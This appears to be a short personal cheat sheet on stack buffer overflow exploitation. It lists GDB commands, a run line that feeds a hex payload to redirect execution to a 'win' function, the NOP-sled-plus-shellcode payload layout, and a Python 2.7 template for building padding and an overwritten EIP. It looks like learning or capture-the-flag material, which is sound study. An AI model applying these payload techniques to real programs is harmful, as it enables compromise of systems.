# GDB

- set disassembly-flavor intel -> 
- disassemble main - get all instructions from a function
- x win / p win -> get address of the "win" function
- - break *<address> - set breakpoint
- r < <(echo -ne "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x67\x05\x40") -> run program with input interpreted as hex. !ATTENTION! little endian vs big endian
- info registers -> check registers ( here while breakpoint was hit)

## Payload format
- (NOP * no_of_nops + shellcode + random_data * no_of_random_data + shellcode_memory_address)

## Construvting payload - python2.7
```
import struct

padding = "A" * 4 + "B" * 4 + "C" * 4 + "D" * 4 + "E" * 4 + "F" * 4 + "G" * 4 + "H" * 4 + "I" * 4 + "J" * 4 + "K" * 4 + "L" * 4 + "M" * 4 + "N" * 4 + "O" * 4 + "P" * 4 + "Q" * 4 + "R" * 4 + "S" * 4 + "T" * 4 + "U" * 4 + "V" * 4 + "W" * 4 + "X" * 4 + "Y" * 4 + "Z" * 4
#proper padding value calculated from gdb crash point - EIP address
#padding =

ebp = "AAAA"
shellcode_address = 0x00
eip = struct.pack("I", shellcode_address)

print padding+ebp+eip
```

